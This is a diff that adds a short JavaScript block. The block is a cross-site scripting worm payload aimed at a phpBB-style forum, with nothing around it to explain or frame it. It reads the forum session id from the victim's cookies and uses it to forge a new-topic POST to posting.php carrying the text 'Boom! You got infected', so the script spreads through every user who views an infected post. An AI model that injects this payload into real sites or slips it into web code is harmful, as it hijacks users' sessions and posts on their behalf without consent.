@@ -1,0 +1,7 @@
+<script>
+Ajax=new XMLHttpRequest();
+Ajax.open("POST","posting.php",true);
+Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+sid=document.cookie.match(/sid=(\w*);/)[1];
+Ajax.send("subject=Aha&mode=newtopic&f=1&post=Submit&sid="+sid+"&message=Boom!%20You%20got%20infected");
+</script>
